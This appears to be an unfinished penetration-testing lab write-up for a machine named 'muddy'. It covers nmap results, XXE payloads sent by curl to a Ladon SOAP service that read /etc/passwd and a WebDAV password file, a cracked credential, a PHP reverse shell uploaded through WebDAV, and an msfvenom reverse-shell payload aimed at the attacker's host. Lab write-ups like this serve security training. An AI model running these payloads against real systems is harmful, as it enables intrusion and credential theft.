#InProgress 
```IP
192.168.177.161
```
## Nmap
```
PORT     STATE SERVICE REASON         VERSION
22/tcp   open  ssh     syn-ack ttl 61 OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 74:ba:20:23:89:92:62:02:9f:e7:3d:3b:83:d4:d9:6c (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDGGcX/x/M6J7Y0V8EeUt0FqceuxieEOe2fUH2RsY3XiSxByQWNQi+XSrFElrfjdR2sgnauIWWhWibfD+kTmSP5gkFcaoSsLtgfMP/2G8yuxPSev+9o1N18gZchJneakItNTaz1ltG1W//qJPZDHmkDneyv798f9ZdXBzidtR5/+2ArZd64bldUxx0irH0lNcf+ICuVlhOZyXGvSx/ceMCRozZrW2JQU+WLvs49gC78zZgvN+wrAZ/3s8gKPOIPobN3ObVSkZ+zngt0Xg/Zl11LLAbyWX7TupAt6lTYOvCSwNVZURyB1dDdjlMAXqT/Ncr4LbP+tvsiI1BKlqxx4I2r
|   256 54:8f:79:55:5a:b0:3a:69:5a:d5:72:39:64:fd:07:4e (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBCpAb2jUKovAahxmPX9l95Pq9YWgXfIgDJw0obIpOjOkdP3b0ukm/mrTNgX2lg1mQBMlS3lzmQmxeyHGg9+xuJA=
|   256 7f:5d:10:27:62:ba:75:e9:bc:c8:4f:e2:72:87:d4:e2 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIE0omUJRIaMtPNYa4CKBC+XUzVyZsJ1QwsksjpA/6Ml+
25/tcp   open  smtp    syn-ack ttl 61 Exim smtpd 4.92
| smtp-commands: muddy Hello muddy.ugc [192.168.45.192], SIZE 52428800, 8BITMIME, PIPELINING, CHUNKING, PRDR, HELP
|_ Commands supported: AUTH HELO EHLO MAIL RCPT DATA BDAT NOOP QUIT RSET HELP
80/tcp   open  http    syn-ack ttl 61 Apache httpd 2.4.38 ((Debian))
|_http-title: Muddy | Found some mud? Call us! &#8211; A muddy WordPress!
|_http-server-header: Apache/2.4.38 (Debian)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-generator: WordPress 5.7
111/tcp  open  rpcbind syn-ack ttl 61 2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|_  100000  3,4          111/udp6  rpcbind
908/tcp  open  unknown syn-ack ttl 61
8888/tcp open  http    syn-ack ttl 61 WSGIServer 0.1 (Python 2.7.16)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: WSGIServer/0.1 Python/2.7.16
|_http-title: Ladon Service Catalog
Service Info: Host: muddy; OS: Linux; CPE: cpe:/o:linux:linux_kernel

```

## Nmap UDP


# Enumeration
## SMTP
![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241021102002.png?raw=true)

## HTTP 80
Wordpress 5.7
![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241021101424.png?raw=true)
no parece que pueda entrar con credenciales por defecto a webdav
no encuentro el wp-admin
con davtest y nuestras nuevas credenciales conseguidas en el 8888 vemos que podemos ejecutar y subir ficheros php
![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241021113305.png?raw=true)
Y ahora con cadaver subimos una revshell
![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241021113138.png?raw=true)
![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241021113419.png?raw=true)
## HTTP 8888
![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241021094337.png?raw=true)
powered by ladon for python
```txt
curl -s -X $'POST' \
-H $'Content-Type: text/xml;charset=UTF-8' \
-H $'SOAPAction: \"http://muddy.ugc:8888/muddy/soap11/checkout\"' \
--data-binary $'<?xml version="1.0"?>
<!DOCTYPE uid
[<!ENTITY passwd SYSTEM "file:///etc/passwd">
]>
<soapenv:Envelope xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"
xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\"
xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\"
xmlns:urn=\"urn:HelloService\"><soapenv:Header/>
<soapenv:Body>
<urn:checkout soapenv:encodingStyle=\"http://schemas.xmlsoap.org/soap/encoding/\">
<uid xsi:type=\"xsd:string\">&passwd;</uid>
</urn:checkout>
</soapenv:Body>
</soapenv:Envelope>' \
'http://muddy.ugc:8888/muddy/soap11' | xmllint --format -
```
![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241021095142.png?raw=true)
user ian seems to have sh

```
curl -s -X $'POST' \
-H $'Content-Type: text/xml;charset=UTF-8' \
-H $'SOAPAction: \"http://muddy.ugc:8888/muddy/soap11/checkout\"' \
--data-binary $'<?xml version="1.0"?>
<!DOCTYPE uid
[<!ENTITY passwd SYSTEM "file:///var/www/html/webdav/passwd.dav">
]>
<soapenv:Envelope xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"
xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\"
xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\"
xmlns:urn=\"urn:HelloService\"><soapenv:Header/>
<soapenv:Body>
<urn:checkout soapenv:encodingStyle=\"http://schemas.xmlsoap.org/soap/encoding/\">
<uid xsi:type=\"xsd:string\">&passwd;</uid>
</urn:checkout>
</soapenv:Body>
</soapenv:Envelope>' \
'http://muddy.ugc:8888/muddy/soap11' | xmllint --format -
```
![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241021112019.png?raw=true)
```
administrant:$apr1$GUG1OnCu$uiSLaAQojCm14lPMwISDi0
```
```
administrant:sleepless
```
Vamos al webdav del puerto 80 con nuestras nuevas credenciales
# PrivEsc

## Manual

![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241021120626.png?raw=true)
```
msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.45.192 LPORT=443 -a x64 -f elf -o netstat
```

## Automated

### Peass

```
-rw-r--r-- 1 root root 3296 Mar 20  2021 /var/www/html/wp-config.php                    
define( 'DB_NAME', 'wp' );                                                              
define( 'DB_USER', 'wpadmin' );                                                         
define( 'DB_PASSWORD', 'ec99e2a005aa8cf0550ddfbdcde11141' );                            
define( 'DB_HOST', 'localhost' ); 
```

crontab -l
```
@reboot /usr/local/bin/ladon-2.7-ctl testserve /var/tmp/ladon/muddy.py -p 8000
```

### Mimikatz

